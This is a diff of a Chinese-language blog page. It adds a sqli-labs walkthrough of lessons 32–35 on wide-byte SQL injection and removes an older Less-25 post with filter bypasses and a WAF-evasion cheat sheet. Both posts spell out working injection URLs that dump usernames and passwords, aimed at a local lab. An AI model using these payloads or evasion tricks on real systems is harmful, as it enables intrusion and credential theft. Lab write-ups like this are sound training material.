@@ -156,6 +156,61 @@
 
 
   
+    <article id="post-sql-labs-Less-32~33-35" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/20/sql-labs-Less-32~33-35/" class="article-date">
+  <time datetime="2021-02-20T05:08:39.000Z" itemprop="datePublished">2021-02-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/20/sql-labs-Less-32~33-35/">sql-labs-Less-32~33</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-32</h1>
+进入http://127.0.0.1/sql/Less-32/，输入?id=1,正常输出，再输入'还是正常，
+看到下面的提示：
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33-35/1.png" alt="1"><br>发现输入的’被转义成&#39;，查看源代码:</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33-35/2.png" alt="2"><br>意思大概就是在’、”、\前面加上一个\使他们被转义，所以我们用普通的方法不能注入。<br>我们输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD&#39;(%E8%BF%99%E9%87%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%A6%81%E7%94%A8%df%EF%BC%8C%E5%8F%AA%E8%A6%81%E8%83%BD%E5%92%8C%5c%E7%BB%84%E6%88%90%E4%B8%80%E4%B8%AA%E6%B1%89%E5%AD%97%E5%B0%B1%E8%A1%8C%EF%BC%8C%E5%A6%82%aa,%bb,%cc...)%EF%BC%8C%E5%8F%91%E7%94%9F%E6%8A%A5%E9%94%99%EF%BC%8C%E9%80%9A%E8%BF%87%E5%9B%9E%E6%98%BE%E4%BF%A1%E6%81%AF%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BA%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E6%98%AF&#39;%EF%BC%8C%E5%86%8D%E8%BE%93%E5%85%A5--+%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%8F%AF%E4%BB%A5%E7%94%A8&#39;%E6%B3%A8%E5%85%A5%E3%80%82">http://127.0.0.1/sql/Less-32/?id=1%df&#39;(这里不一定要用%df，只要能和%5c组成一个汉字就行，如%aa,%bb,%cc...)，发生报错，通过回显信息可以看出注入字符是&#39;，再输入--+，正常输出，说明可以用&#39;注入。</a><br>可以用联合注入、报错注入和延时注入。<br>这里用联合注入：<br>查列数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-27/?id=1%df&#39;</a> order by 3–+<br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df&#39;union</a> select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df&#39;union</a> select 1,database(),3–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-32/?id=331%df&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3–+<br>（’0x7365637572697479‘是security的16进制，这里用是因为会对’进行转义，然后就出错，16进制转换：hackbar&gt;&gt;encoding&gt;&gt;hex encode）<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-32/?id=331%df&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-32/?id=331%df&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
+<h1>Less-33</h1>
+查看源代码:
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-32~33-35/3.png" alt="3"><br>发现里面有一个addslashes函数，（addslashes函数的作用是在预定义字符前加一个\进行转义）。<br>方法一：直接宽字节注入。<br>方法二：把加上的\转义或闭合（%aa%5c’）<br>查列数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=1%df%5c&#39;</a> order by 3–+<br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD%5C&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df%5c&#39;union</a> select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=1%EF%BF%BD%5C&#39;union">http://127.0.0.1/sql/Less-32/?id=1%df%5c&#39;union</a> select 1,database(),3–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=331%df%5c&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=331%df%5c&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-32/?id=331%EF%BF%BD%5C&#39;">http://127.0.0.1/sql/Less-32/?id=331%df%5c&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
+<h1>Less-35</h1>
+和上面差不多，只是是整型注入，然后注意一下构造的语句中不要有'即可。
+
+
+<h1>宽字节注入</h1>
+
+<p>宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。<br>宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。<br>中文、韩文、日文等均存在宽字节，英文默认都是一个字节。在使用PHP连接MySQL的时候，<br>当设置“set  character_set_client = gbk”时会导致一个编码转换的问题。</p>
+<p>例子：   id= 1’处理1\’进行编码1%5c%27带入sql后id=\’and XXXX此时无法完成注入<br>         id=1%df’处理1%df\’进行编码1%df%5c%27带入sql后id=1運’and XXX 此时存在宽字节注入漏洞</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/helloc0de/article/details/76180190">https://blog.csdn.net/helloc0de/article/details/76180190</a><br>          <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a><br>推荐解码网站：<a target="_blank" rel="noopener" href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">http://www.mytju.com/classcode/tools/urldecode_gb2312.asp</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/20/sql-labs-Less-32~33-35/" data-id="ckle0x2jd0000qwuxc8trhily" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-29-31" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/18/sql-labs-Less-29-31/" class="article-date">
@@ -430,90 +485,6 @@ https://www.cnblogs.com/lcamry/p/5762961.html
 
 
   
-    <article id="post-sql-labs-Less-25" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/15/sql-labs-Less-25/" class="article-date">
-  <time datetime="2021-02-15T12:10:44.000Z" itemprop="datePublished">2021-02-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/15/sql-labs-Less-25/">sql-labs-Less-25</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%E3%80%82">http://127.0.0.1/sql/Less-25/，输入?id=1，正常输出。</a><br>再输入’，发生报错，从报错信息来看这关的注入字符是’，再输入–+进行注释，正常输出，说明可以用’注入。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> order by 3–+，发现报错：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/15/sql-labs-Less-25/1.png" alt="2"><br>发现报错语句中只有‘der by’，与我们输入的‘order by’不一样。<br>查看源代码：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/15/sql-labs-Less-25/1.png" alt="1"><br>发现对大小写的’or’和’and’进行了过滤，既输入的注入语句中的or和and会变为空。</p>
-<p>方法一（联合注入）：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,database(),3–+（<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3–+）<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
-<p>方法二（报错注入）：<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,database()))–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+<br>（这里不用group_concat函数是因为在报错语句在它的输出有字数限制(?)）</p>
-<h2>小结</h2>
-WAF绕过<br>
-1.sql注释符绕过
-（1） union /**/select  我们将union select之间的空格使用注释符进行替换（适用于对union select之间的空格进行检测的情况）<br>
-（2）union/*crow%0%32#*/select 我们在注释符中间填充内容<br>
-（3）union/*aaaaaaaaaabbbbbbbbbcccccccccccdddddddddddeeeeeeeeeeee%%%%%%%%%*/select  构造较大数据<br>
-（4）/*!union select*/内联注释        我们使用内联注释，mysql特有<br>
-2.空白符绕过   <br>           
-（1）mysql空白符：%09（TAB键（水平））；%0A（新建一行）;  %0B（TAB键（垂直））;  %0D（return功能）;  %20（空格）;  %0C（新的一页）;  %A0（空格）;  /*XXX*/<br>
-（2）正则空白符： %09；%0A;  %0B;  %0D;  %20; <br>
-     %25其实就是百分号  %25A0  就是空白符  <br>    
-3.函数分割符号<br>
-将一个函数进行分割concat()<br>
- %25其实就是百分号  %25A0  就是空白符    <br>  
-concat%2520(<br>
-concat/**/(<br>
-concat%250c(<br>
-concat%25a0(<br>
-4.浮点数法<br>
- waf对于id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测<br>
-5.利用error-based进行sql注入<br>
-extractvalue(1, concat(0x5c,md5(3)));<br>
-updatexml(1, concat(0x5d,md5(3)),1);<br>
-GeometryCollection((select*from(select*from(select@@version)f)x))<br>
-polygon((select*from(select name_const(version(),1))x))<br>
-linestring()<br>
-multipoint()<br>
-multilinestring()<br>
-multipolygon()<br>
-6.mysql特殊语法<br>
-select {x schema_name} from {x information_schema.schemata};<br>
-select {x 1};<br>
-7.大小写绕过<br>
-如果对关键字and、or、union等进行了过滤，可以考虑使用大小写混合的方法<br>
-Or  aNd  UniOn<br>
-但是很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法<br>
-8.关键字重复<br>
-OORr >> or (既Less-25的方法一)<br>
-9.关键字替换<br>
-如果还是无法绕过，可以考虑替换的方法<br>
-and >> &&    or >> ||(既Less-25的方法二)   like可以替换 =    <> 等价于 !=  --+、#可以替换为;%00 <br>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/15/sql-labs-Less-25/" data-id="ckl6tiqeg0000hkux2cuug9qc" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -558,15 +529,15 @@ and >> &&    or >> ||(既Less-25的方法二)   like可以替换 =    <> 等价�
           </li>
         
           <li>
+            <a href="/2021/02/20/sql-labs-Less-32~33-35/">sql-labs-Less-32~33</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/18/sql-labs-Less-29-31/">sql-labs-Less-29~31</a>
           </li>
         
           <li>
             <a href="/2021/02/17/sql-labs-Less-28-28a/">sql-labs-Less-28-28a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/17/sql-labs-Less-27a/">sql-labs-Less-27a</a>
           </li>
         
       </ul>
